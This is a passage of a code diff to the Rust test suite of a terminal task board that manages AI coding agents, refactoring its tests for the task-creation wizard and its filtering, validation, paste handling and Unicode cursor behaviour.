+    advance_to(&mut app, WizardStep::Agent);
+    press_key(&mut app, KeyCode::Char('j'));
+    let picked = app
+        .state
+        .wizard
+        .as_ref()
+        .unwrap()
+        .agent_name()
+        .unwrap()
+        .to_string();
+    assert_ne!(picked, app.state.config.default_agent, "a real change");
+
+    advance_to(&mut app, WizardStep::Prompt);
+    press_key(&mut app, KeyCode::Enter);
+
+    assert_eq!(app.state.board.tasks.len(), 1);
+    assert_eq!(app.state.board.tasks[0].agent, picked);
+}
+
+/// `/` opens a filter on a list step. While it is open ordinary characters go
+/// to the filter, which is why navigation there is arrows rather than `j`/`k`.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn slash_filters_a_list_step() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Filtering");
+    advance_to(&mut app, WizardStep::Plugin);
+
+    let all = app.state.wizard.as_ref().unwrap().plugin.matching().len();
+    assert!(all > 2, "need something to filter, got {all}");
+
+    press_key(&mut app, KeyCode::Char('/'));
+    assert!(app.state.wizard.as_ref().unwrap().plugin.is_filtering());
+    type_str(&mut app, "gsd");
+
+    let list = &app.state.wizard.as_ref().unwrap().plugin;
+    assert_eq!(list.matching().len(), 1, "narrowed to one");
+    assert_eq!(list.selected_option().unwrap().name, "gsd");
+    assert_eq!(
+        list.filter.as_ref().unwrap().as_str(),
+        "gsd",
+        "the characters went to the filter, not to navigation"
+    );
+}
+
+/// Backspacing the filter empty leaves filter mode, rather than sitting in a
+/// mode with nothing typed and `j`/`k` still inert.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn emptying_the_filter_leaves_filter_mode() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Filtering");
+    advance_to(&mut app, WizardStep::Plugin);
+
+    press_key(&mut app, KeyCode::Char('/'));
+    type_str(&mut app, "gs");
+    press_key(&mut app, KeyCode::Backspace);
+    press_key(&mut app, KeyCode::Backspace);
+
+    assert!(!app.state.wizard.as_ref().unwrap().plugin.is_filtering());
+    // ...and `j` navigates again rather than filtering.
+    let before = app.state.wizard.as_ref().unwrap().plugin.selected;
+    press_key(&mut app, KeyCode::Char('j'));
+    assert_ne!(app.state.wizard.as_ref().unwrap().plugin.selected, before);
+}
+
+/// An open filter owns Esc the way a prompt dropdown does: closing the filter
+/// must not take the whole wizard with it.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn esc_closes_an_open_filter_without_leaving_the_wizard() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Keep me");
+    advance_to(&mut app, WizardStep::Plugin);
+
+    press_key(&mut app, KeyCode::Char('/'));
+    type_str(&mut app, "gsd");
+    assert!(app.state.wizard.as_ref().unwrap().plugin.is_filtering());
+
+    press_key(&mut app, KeyCode::Esc);
+    assert!(app.state.wizard.is_some(), "the wizard survives");
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Plugin));
+    let list = &app.state.wizard.as_ref().unwrap().plugin;
+    assert!(!list.is_filtering(), "only the filter closed");
+    assert_eq!(list.matching().len(), list.options.len(), "whole list back");
+
+    // A second Esc, with no filter to close, cancels as it does anywhere else.
+    press_key(&mut app, KeyCode::Esc);
+    assert!(app.state.wizard.is_none());
+}
+
+/// The plugin list is filtered by the agent, so saving straight from the agent
+/// step must not persist a plugin that agent does not support.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn saving_from_the_agent_step_refilters_the_plugin() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Agent then save");
+
+    advance_to(&mut app, WizardStep::Agent);
+    press_key(&mut app, KeyCode::Char('j'));
+    let agent = app
+        .state
+        .wizard
+        .as_ref()
+        .unwrap()
+        .agent_name()
+        .unwrap()
+        .to_string();
+
+    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
+        .unwrap();
+
+    assert_eq!(app.state.board.tasks.len(), 1);
+    let task = &app.state.board.tasks[0];
+    assert_eq!(task.agent, agent);
+    // Whatever plugin was stored has to be one this agent supports.
+    if let Some(name) = task.plugin.as_deref() {
+        let content = skills::BUNDLED_PLUGINS
+            .iter()
+            .find(|(n, _, _)| *n == name)
+            .map(|(_, _, c)| *c);
+        if let Some(content) = content {
+            let plugin: crate::config::WorkflowPlugin = toml::from_str(content).unwrap();
+            assert!(
+                plugin.supports_agent(&agent),
+                "saved {name} for {agent}, which does not support it"
+            );
+        }
+    }
+}
+
+/// Enter picks whatever the filter left under the cursor, and the pick survives
+/// the filter closing with the step.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn a_filtered_pick_is_what_gets_saved() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Filtered pick");
+    advance_to(&mut app, WizardStep::Plugin);
+
+    press_key(&mut app, KeyCode::Char('/'));
+    type_str(&mut app, "gsd");
+    advance_to(&mut app, WizardStep::Prompt);
+    press_key(&mut app, KeyCode::Enter);
+
+    assert_eq!(app.state.board.tasks.len(), 1);
+    assert_eq!(app.state.board.tasks[0].plugin.as_deref(), Some("gsd"));
+}
+
+// --- richer validation ---
+
+/// A duplicate title is legal but almost never intended, and the board shows
+/// titles alone — two identical cards are indistinguishable.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn a_duplicate_title_is_refused() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Fix login");
+    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(app.state.board.tasks.len(), 1);
+
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Fix login");
+    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
+        .unwrap();
+
+    assert_eq!(app.state.board.tasks.len(), 1, "the second was refused");
+    let validation = app.state.wizard.as_ref().unwrap().validation.as_deref();
+    assert!(
+        validation.is_some_and(|v| v.contains("already called")),
+        "{validation:?}"
+    );
+}
+
+/// Editing a task must not trip over its own title.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn a_task_does_not_clash_with_itself_when_edited() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Fix login");
+    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
+        .unwrap();
+
+    // Reopen it and save without changing the title.
+    press_key(&mut app, KeyCode::Enter);
+    assert!(app.state.wizard.as_ref().unwrap().is_editing());
+    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
+        .unwrap();
+
+    assert!(app.state.wizard.is_none(), "saved, not refused");
+    assert_eq!(app.state.board.tasks.len(), 1);
+}
+
+/// The board draws a title on one card line; one long enough to be truncated
+/// everywhere it appears is not a useful name.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn an_overlong_title_is_refused_with_its_length() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, &"x".repeat(MAX_TASK_TITLE_CHARS + 1));
+    press_key(&mut app, KeyCode::Enter);
+
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
+    let validation = app.state.wizard.as_ref().unwrap().validation.as_deref();
+    assert!(
+        validation.is_some_and(|v| v.contains(&format!("{}", MAX_TASK_TITLE_CHARS + 1))),
+        "the message should say how long it is: {validation:?}"
+    );
+    assert!(app.state.board.tasks.is_empty());
+}
+
+#[test]
+#[cfg(feature = "test-mocks")]
+fn a_title_at_the_limit_is_accepted() {
+    let mut app = make_test_app_with_agents();
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, &"x".repeat(MAX_TASK_TITLE_CHARS));
+    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
+        .unwrap();
+    assert_eq!(app.state.board.tasks.len(), 1);
+}
+
+/// With one agent installed there is nothing to choose, so the step does not
+/// appear — the same rule the plugin step follows.
+#[test]
+#[cfg(feature = "test-mocks")]
+fn the_agent_step_is_skipped_when_only_one_agent_is_installed() {
+    let mut app = make_test_app_with_agents();
+    app.state.available_agents.truncate(1);
+    press_key(&mut app, KeyCode::Char('o'));
+    type_str(&mut app, "Only one agent");
+    press_key(&mut app, KeyCode::Enter);
+
+    assert_ne!(app.state.wizard_step(), Some(WizardStep::Agent));
+    let steps = app.state.wizard.as_ref().unwrap().steps();
+    assert!(!steps.contains(&WizardStep::Agent), "{steps:?}");
 }
 
 // --- Trigger Swap: / for skills, ! for task refs ---
@@ -5806,12 +7088,12 @@ fn test_skill_search_slash_trigger() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Test");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     // Type `/` at start of buffer — should trigger skill search
     press_key(&mut app, KeyCode::Char('/'));
     assert!(app.state.skill_search.is_some());
-    assert_eq!(app.state.input_buffer, "/");
+    assert_eq!(wiz(&app).buffer, "/");
 
     // Cancel skill search
     press_key(&mut app, KeyCode::Esc);
@@ -5825,12 +7107,12 @@ fn test_slash_no_trigger_mid_word() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Test");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     // `/` after a letter (no space) — should NOT trigger skill search
     type_str(&mut app, "http:/");
     assert!(app.state.skill_search.is_none());
-    assert!(app.state.input_buffer.contains("http:/"));
+    assert!(wiz(&app).buffer.contains("http:/"));
 }
 
 #[test]
@@ -5840,7 +7122,7 @@ fn test_slash_triggers_after_space() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Test");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     // `/` after a space — should trigger skill search
     type_str(&mut app, "run ");
@@ -5862,7 +7144,7 @@ fn test_task_ref_search_exclamation_trigger() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "New task");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     // Type `!` at start of buffer — should trigger task ref search
     press_key(&mut app, KeyCode::Char('!'));
@@ -5885,7 +7167,7 @@ fn test_task_ref_inserts_reference() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Uses auth");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     // Trigger task ref search
     press_key(&mut app, KeyCode::Char('!'));
@@ -5897,14 +7179,26 @@ fn test_task_ref_inserts_reference() {
 
     // Buffer should contain ![Setup auth]
     assert!(
-        app.state.input_buffer.contains("![Setup auth]"),
+        wiz(&app).buffer.contains("![Setup auth]"),
         "Buffer: {}",
-        app.state.input_buffer
+        wiz(&app).buffer
     );
     // Referenced task ID should be tracked
-    assert!(!app.state.wizard_referenced_task_ids.is_empty());
+    assert!(!app
+        .state
+        .wizard
+        .as_ref()
+        .unwrap()
+        .referenced_task_ids
+        .is_empty());
     // Highlighted references should contain the reference text
-    assert!(app.state.highlighted_references.contains("![Setup auth]"));
+    assert!(app
+        .state
+        .wizard
+        .as_ref()
+        .unwrap()
+        .highlighted_references
+        .contains("![Setup auth]"));
 }
 
 #[test]
@@ -5919,7 +7213,7 @@ fn test_task_ref_after_space() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Ref test");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     // Type some text, then space + `!` — should trigger
     type_str(&mut app, "depends on ");
@@ -5936,9 +7230,9 @@ fn test_korean_char_advances_cursor_by_utf8_length_in_title() {
     press_key(&mut app, KeyCode::Char('o'));
     // Type Korean char '한' (3 bytes in UTF-8)
     press_key(&mut app, KeyCode::Char('한'));
-    assert_eq!(app.state.input_buffer, "한");
+    assert_eq!(wiz(&app).buffer, "한");
     // Cursor must land on a char boundary (byte 3), not mid-character (byte 1)
-    assert_eq!(app.state.input_cursor, 3);
+    assert_eq!(wiz(&app).cursor, 3);
 }
 
 #[test]
@@ -5948,12 +7242,12 @@ fn test_korean_word_in_description_preserves_buffer_and_cursor() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Title");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     // Typing two Korean chars should not panic and should yield correct buffer
     type_str(&mut app, "한글");
-    assert_eq!(app.state.input_buffer, "한글");
-    assert_eq!(app.state.input_cursor, 6); // 3+3 bytes
+    assert_eq!(wiz(&app).buffer, "한글");
+    assert_eq!(wiz(&app).cursor, 6); // 3+3 bytes
 }
 
 #[test]
@@ -5963,12 +7257,12 @@ fn test_korean_then_ascii_does_not_panic() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Title");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     // Korean char followed by ASCII must not panic on insert
     type_str(&mut app, "한a");
-    assert_eq!(app.state.input_buffer, "한a");
-    assert_eq!(app.state.input_cursor, 4);
+    assert_eq!(wiz(&app).buffer, "한a");
+    assert_eq!(wiz(&app).cursor, 4);
 }
 
 #[test]
@@ -5978,12 +7272,12 @@ fn test_korean_backspace_removes_whole_char_in_description() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Title");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     type_str(&mut app, "안녕");
     press_key(&mut app, KeyCode::Backspace);
-    assert_eq!(app.state.input_buffer, "안");
-    assert_eq!(app.state.input_cursor, 3);
+    assert_eq!(wiz(&app).buffer, "안");
+    assert_eq!(wiz(&app).cursor, 3);
 }
 
 #[test]
@@ -5993,12 +7287,12 @@ fn test_korean_left_arrow_moves_whole_char_in_description() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Title");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     type_str(&mut app, "안녕");
     press_key(&mut app, KeyCode::Left);
     // Cursor must land on char boundary between 안 (bytes 0..3) and 녕 (bytes 3..6)
-    assert_eq!(app.state.input_cursor, 3);
+    assert_eq!(wiz(&app).cursor, 3);
 }
 
 #[test]
@@ -6009,10 +7303,10 @@ fn test_korean_right_arrow_moves_whole_char_in_title() {
     type_str(&mut app, "안녕");
     // Move cursor to start
     press_key(&mut app, KeyCode::Home);
-    assert_eq!(app.state.input_cursor, 0);
+    assert_eq!(wiz(&app).cursor, 0);
     // Right arrow should advance one char (3 bytes), not one byte
     press_key(&mut app, KeyCode::Right);
-    assert_eq!(app.state.input_cursor, 3);
+    assert_eq!(wiz(&app).cursor, 3);
 }
 
 #[test]
@@ -6022,8 +7316,8 @@ fn test_japanese_typing_preserves_cursor() {
     let mut app = make_test_app();
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "こんにちは");
-    assert_eq!(app.state.input_buffer, "こんにちは");
-    assert_eq!(app.state.input_cursor, 15); // 5 chars * 3 bytes
+    assert_eq!(wiz(&app).buffer, "こんにちは");
+    assert_eq!(wiz(&app).cursor, 15); // 5 chars * 3 bytes
 }
 
 #[test]
@@ -6032,8 +7326,8 @@ fn test_chinese_typing_preserves_cursor() {
     let mut app = make_test_app();
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "你好");
-    assert_eq!(app.state.input_buffer, "你好");
-    assert_eq!(app.state.input_cursor, 6); // 2 chars * 3 bytes
+    assert_eq!(wiz(&app).buffer, "你好");
+    assert_eq!(wiz(&app).cursor, 6); // 2 chars * 3 bytes
 }
 
 #[test]
@@ -6043,11 +7337,11 @@ fn test_emoji_typing_handles_4_byte_utf8() {
     let mut app = make_test_app();
     press_key(&mut app, KeyCode::Char('o'));
     press_key(&mut app, KeyCode::Char('👋'));
-    assert_eq!(app.state.input_buffer, "👋");
-    assert_eq!(app.state.input_cursor, 4);
+    assert_eq!(wiz(&app).buffer, "👋");
+    assert_eq!(wiz(&app).cursor, 4);
     press_key(&mut app, KeyCode::Backspace);
-    assert_eq!(app.state.input_buffer, "");
-    assert_eq!(app.state.input_cursor, 0);
+    assert_eq!(wiz(&app).buffer, "");
+    assert_eq!(wiz(&app).cursor, 0);
 }
 
 #[test]
@@ -6058,13 +7352,13 @@ fn test_delete_removes_whole_multibyte_char_in_description() {
     press_key(&mut app, KeyCode::Char('o'));
     type_str(&mut app, "Title");
     press_key(&mut app, KeyCode::Enter);
-    assert_eq!(app.state.input_mode, InputMode::InputDescription);
+    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
 
     type_str(&mut app, "안녕");
     press_key(&mut app, KeyCode::Home);
     press_key(&mut app, KeyCode::Delete);
-    assert_eq!(app.state.input_buffer, "녕");
-    assert_eq!(app.state.input_cursor, 0);
+    assert_eq!(wiz(&app).buffer, "녕");
+    assert_eq!(wiz(&app).cursor, 0);
 }
 
 // --- Wrapped cursor position (for IME composition anchoring under wrap) ---
@@ -6338,8 +7632,9 @@ fn test_invariant_long_buffer_with_prefix() {
 #[test]
 #[cfg(feature = "test-mocks")]
 fn test_footer_text_select_plugin() {
-    let text = build_footer_text(InputMode::SelectPlugin, false, 0, false, false);
-    assert!(text.contains("select plugin"));
+    let text = build_footer_text(Some(WizardStep::Plugin), false, 0, false, false);
+    assert!(text.contains("[j/k] select"));
+    assert!(text.contains("[/] filter"));
     assert!(text.contains("Tab"));
     assert!(text.contains("Enter"));
     assert!(text.contains("Esc"));
@@ -6348,7 +7643,7 @@ fn test_footer_text_select_plugin() {
 #[test]
 #[cfg(feature = "test-mocks")]
 fn test_footer_text_description_shows_all_triggers() {
-    let text = build_footer_text(InputMode::InputDescription, false, 0, false, false);
+    let text = build_footer_text(Some(WizardStep::Prompt), false, 0, false, false);
     assert!(
         text.contains("[#] files"),
         "Missing files trigger: {}",
@@ -7139,8 +8434,8 @@ fn refresh_with_hook(
     app.state.phase_status_cache["t1"].0
 }
 
-/// The regression that motivates the whole change: an agent thinking silently
-/// for longer than 15s used to be reported as Idle.
+/// An agent's own report beats the pane-hash heuristic: thinking silently for
+/// longer than 15s is Working, not Idle.
 #[test]
 #[cfg(feature = "test-mocks")]
 fn test_hook_working_beats_a_stale_pane_hash() {
@@ -9519,8 +10814,8 @@ fn test_stuck_task_idle_since_cleared_when_not_idle() {
 }
 
 // =============================================================================
-// Tests for pure functions: fuzzy_score, word_boundary_left/right,
-// generate_task_slug, centered_rect, centered_rect_fixed_width,
+// Tests for pure functions: fuzzy_score, generate_task_slug, centered_rect,
+// centered_rect_fixed_width,
 // transform_skill_frontmatter, transform_skill_for_opencode
 // =============================================================================
 
@@ -9556,49 +10851,6 @@ fn test_fuzzy_score_case_sensitive() {
     // function is case-sensitive
     assert_eq!(fuzzy_score("Hello", "hello"), 0);
     assert!(fuzzy_score("hello", "hello") > 0);
-}
-
-// --- word_boundary_left ---
-
-#[test]
-fn test_word_boundary_left_at_zero() {
-    assert_eq!(word_boundary_left("hello world", 0), 0);
-}
-
-#[test]
-fn test_word_boundary_left_from_end_of_word() {
-    // "hello world" — cursor at 5 (end of "hello") → should land at 0
-    assert_eq!(word_boundary_left("hello world", 5), 0);
-}
-
-#[test]
-fn test_word_boundary_left_skips_space_then_word() {
-    // "hello world" cursor at 11 (end) → skip "d l r o w" then space → land at 6
-    assert_eq!(word_boundary_left("hello world", 11), 6);
-}
-
-#[test]
-fn test_word_boundary_left_from_middle_of_word() {
-    // "hello world" cursor at 8 → inside "world" → land at 6
-    assert_eq!(word_boundary_left("hello world", 8), 6);
-}
-
-#[test]
-fn test_word_boundary_left_empty_string() {
-    assert_eq!(word_boundary_left("", 0), 0);
-}
-
-// --- word_boundary_right ---
-
-#[test]
-fn test_word_boundary_right_from_middle_of_word() {
-    // "hello world" cursor at 2 → skip "llo" → skip " " → land at 6
-    assert_eq!(word_boundary_right("hello world", 2), 6);
-}
-
-#[test]
-fn test_word_boundary_right_empty_string() {
-    assert_eq!(word_boundary_right("", 0), 0);
 }
 
 // --- generate_task_slug ---
@@ -10147,17 +11399,12 @@ fn test_delete_task_resources_noop_when_no_session_or_worktree() {
 fn test_save_task_creates_new_task_in_db() {
     let mut app = make_test_app();
 
-    // Set up wizard state for a new task
-    app.state.pending_task_title = "New Task Title".to_string();
-    app.state.input_buffer = "Task description here".to_string();
-    app.state.editing_task_id = None;
-    app.state.wizard_plugin_options = vec![crate::tui::app::PluginOption {
-        name: "agtx".to_string(),
-        label: "agtx".to_string(),
-        description: "".to_string(),
-        active: true,
-    }];
-    app.state.wizard_selected_plugin = 0;
+    app.state.wizard = Some(filled_wizard(
+        "New Task Title",
+        "Task description here",
+        "agtx",
+        None,
+    ));
 
     app.save_task().unwrap();
 
@@ -10185,17 +11432,12 @@ fn test_save_task_updates_existing_task() {
         .unwrap();
     app.refresh_tasks().unwrap();
 
-    // Set up wizard state for editing
-    app.state.pending_task_title = "Updated Title".to_string();
-    app.state.input_buffer = "Updated description".to_string();
-    app.state.editing_task_id = Some("edit-me".to_string());
-    app.state.wizard_plugin_options = vec![crate::tui::app::PluginOption {
-        name: "gsd".to_string(),
-        label: "gsd".to_string(),
-        description: "".to_string(),
-        active: true,
-    }];
-    app.state.wizard_selected_plugin = 0;
+    app.state.wizard = Some(filled_wizard(
+        "Updated Title",
+        "Updated description",
+        "gsd",
+        Some("edit-me"),
+    ));
 
     app.save_task().unwrap();
 
@@ -10219,16 +11461,7 @@ fn test_save_task_updates_existing_task() {
 fn test_save_task_empty_description_stored_as_none() {
     let mut app = make_test_app();
 
-    app.state.pending_task_title = "Title only".to_string();
-    app.state.input_buffer = String::new(); // empty
-    app.state.editing_task_id = None;
-    app.state.wizard_plugin_options = vec![crate::tui::app::PluginOption {
-        name: "agtx".to_string(),
-        label: "agtx".to_string(),
-        description: "".to_string(),
-        active: true,
-    }];
-    app.state.wizard_selected_plugin = 0;
+    app.state.wizard = Some(filled_wizard("Title only", "", "agtx", None));
 
     app.save_task().unwrap();
 
@@ -10236,44 +11469,59 @@ fn test_save_task_empty_description_stored_as_none() {
     assert_eq!(tasks[0].description, None);
 }
 
-// --- init_plugin_selection ---
+// --- seed_plugin_step ---
 
 #[test]
 #[cfg(feature = "test-mocks")]
-fn test_init_plugin_selection_includes_agtx() {
-    let mut app = make_test_app();
-    app.init_plugin_selection();
-    let names: Vec<&str> = app
+fn test_seed_plugin_step_includes_agtx() {
+    let mut app = make_test_app_with_agents();
+    app.state.wizard = Some(crate::tui::wizard::WizardState::creating());
+    app.seed_plugin_step();
+    let names: Vec<String> = app
         .state
-        .wizard_plugin_options
+        .wizard
+        .as_ref()
+        .unwrap()
+        .plugin
+        .options
         .iter()
-        .map(|o| o.name.as_str())
+        .map(|o| o.name.clone())
         .collect();
-    assert!(names.contains(&"agtx"), "options={:?}", names);
+    assert!(names.iter().any(|n| n == "agtx"), "options={:?}", names);
 }
 
 #[test]
 #[cfg(feature = "test-mocks")]
-fn test_init_plugin_selection_sets_active_from_config() {
-    let mut app = make_test_app();
+fn test_seed_plugin_step_sets_active_from_config() {
+    let mut app = make_test_app_with_agents();
     app.state.config.workflow_plugin = Some("gsd".to_string());
-    app.init_plugin_selection();
+    app.state.wizard = Some(crate::tui::wizard::WizardState::creating());
+    app.seed_plugin_step();
 
-    let active = app.state.wizard_plugin_options.iter().find(|o| o.active);
+    let active = app
+        .state
+        .wizard
+        .as_ref()
+        .unwrap()
+        .plugin
+        .options
+        .iter()
+        .find(|o| o.active);
     assert!(active.is_some());
     assert_eq!(active.unwrap().name, "gsd");
 }
 
 #[test]
 #[cfg(feature = "test-mocks")]
-fn test_init_plugin_selection_selected_index_matches_active() {
-    let mut app = make_test_app();
+fn test_seed_plugin_step_selected_index_matches_active() {
+    let mut app = make_test_app_with_agents();
     app.state.config.workflow_plugin = Some("gsd".to_string());
-    app.init_plugin_selection();
+    app.state.wizard = Some(crate::tui::wizard::WizardState::creating());
+    app.seed_plugin_step();
 
-    let idx = app.state.wizard_selected_plugin;
+    let idx = app.state.wizard.as_ref().unwrap().plugin.selected;
     assert!(
-        app.state.wizard_plugin_options[idx].active,
+        app.state.wizard.as_ref().unwrap().plugin.options[idx].active,
         "selected idx {} not active",
         idx
     );
@@ -11697,14 +12945,13 @@ fn test_handle_paste_into_shell_popup_never_touches_tmux_on_the_input_thread() {
 fn test_handle_paste_into_description_editor_at_end() {
     // Paste appends at the current cursor position (end of buffer).
     let mut app = make_test_app();
-    app.state.input_mode = InputMode::InputDescription;
-    app.state.input_buffer = "start ".to_string();
-    app.state.input_cursor = 6;
+    open_prompt_step(&mut app);
+    wiz_mut(&mut app).set_text("start ");
 
     app.handle_paste("pasted text".to_string()).unwrap();
 
-    assert_eq!(app.state.input_buffer, "start pasted text");
-    assert_eq!(app.state.input_cursor, 17); // 6 + len("pasted text")
+    assert_eq!(wiz(&app).buffer, "start pasted text");
+    assert_eq!(wiz(&app).cursor, 17); // 6 + len("pasted text")
 }
 
 #[test]
@@ -11712,14 +12959,14 @@ fn test_handle_paste_into_description_editor_at_end() {
 fn test_handle_paste_into_description_editor_at_mid_cursor() {
     // Paste inserts at the cursor position, pushing subsequent text right.
     let mut app = make_test_app();
-    app.state.input_mode = InputMode::InputDescription;
-    app.state.input_buffer = "ab".to_string();
-    app.state.input_cursor = 1; // between 'a' and 'b'
+    open_prompt_step(&mut app);
+    wiz_mut(&mut app).set_text("ab");
+    wiz_mut(&mut app).cursor = 1; // between 'a' and 'b'
 
     app.handle_paste("XY".to_string()).unwrap();
 
-    assert_eq!(app.state.input_buffer, "aXYb");
-    assert_eq!(app.state.input_cursor, 3); // 1 + len("XY")
+    assert_eq!(wiz(&app).buffer, "aXYb");
+    assert_eq!(wiz(&app).cursor, 3); // 1 + len("XY")
 }
 
 #[test]
@@ -11727,18 +12974,21 @@ fn test_handle_paste_into_description_editor_at_mid_cursor() {
 fn test_handle_paste_noop_in_normal_mode() {
     // In Normal mode with no popup open, paste is silently ignored.
     let mut app = make_test_app();
-    // input_mode starts as Normal, shell_popup is None
-    assert_eq!(app.state.input_mode, InputMode::Normal);
+    // No wizard, no popup — nothing is listening for text.
+    assert_eq!(app.state.wizard_step(), None);
     assert!(app.state.shell_popup.is_none());
 
     app.handle_paste("should be ignored".to_string()).unwrap();
 
-    assert!(app.state.input_buffer.is_empty());
+    assert!(
+        app.state.wizard.is_none(),
+        "a paste must not conjure a wizard to receive it"
+    );
 }
 
-/// Test that switching projects via the sidebar reloads the config from the new project.
-/// Before the fix, config was only loaded at startup so switching projects in the sidebar
-/// would keep the old project's agent settings, causing incorrect agent selection.
+/// Switching projects via the sidebar reloads the config from the new project.
+/// Loading it only at startup would leave the previous project's agent settings
+/// in place and pick the wrong agent.
 #[test]
 #[cfg(feature = "test-mocks")]
 fn test_switch_to_project_reloads_config() {
@@ -12225,8 +13475,9 @@ fn test_argv_event_agents_carry_their_event_in_the_command() {
 // ── submitting a message ────────────────────────────────────────────────────
 //
 // Pane text below is captured verbatim from live sessions. The bare-command case
-// is the one that mattered: a repaint used to count as a submit, so a command
-// parked in a picker looked delivered and the phase never advanced.
+// is the one that matters: a repaint is not a submit, and counting it as one
+// leaves a command parked in a picker looking delivered while the phase never
+// advances.
 
 /// codex 0.144.5, after pasting a bare `$agtx-review`: the picker is open and the
 /// command is still in the composer. Enter here *inserts*; it does not submit.
@@ -12311,11 +13562,10 @@ fn test_submit_message_presses_enter_again_when_the_picker_ate_the_first() {
 
 // ── first-launch dialog handling (wait_for_agent_ready) ──────────────────────
 
-/// Regression: a native-binary agent changes `pane_current_command` the moment
-/// it execs, so the process check used to break out of the readiness loop before
-/// the dialog check below it ever ran. Observed live in a swebench container:
-/// Claude sat on the bypass warning for 300s and the task prompt was typed into
-/// the menu.
+/// A native-binary agent changes `pane_current_command` the moment it execs, so
+/// the process check wins that race — the dialog check has to run first or it
+/// never runs at all. Observed live in a swebench container: Claude sat on the
+/// bypass warning for 300s and the task prompt was typed into the menu.
 #[test]
 #[cfg(feature = "test-mocks")]
 fn test_dismiss_launch_dialog_answers_claude_bypass_warning() {
@@ -12985,9 +14235,9 @@ fn assert_covers_every_agent(covered: &[&str], table: &str) {
     assert!(missing.is_empty(), "{table} is missing: {missing:?}");
 }
 
-/// `LAUNCH_DIALOGS` is now derived from `AGENT_SPECS`. Pinned against the
-/// literals it replaced, and asserting `Session`-scope dialogs stay out — they
-/// are matched per agent, not against any pane.
+/// `LAUNCH_DIALOGS` is derived from `AGENT_SPECS`. Pinned against literals, and
+/// asserting `Session`-scope dialogs stay out — they are matched per agent, not
+/// against any pane.
 #[test]
 fn test_launch_dialog_derivation_matches_the_previous_literals() {
     let mut got: Vec<(Vec<&str>, Vec<&str>)> = LAUNCH_DIALOGS
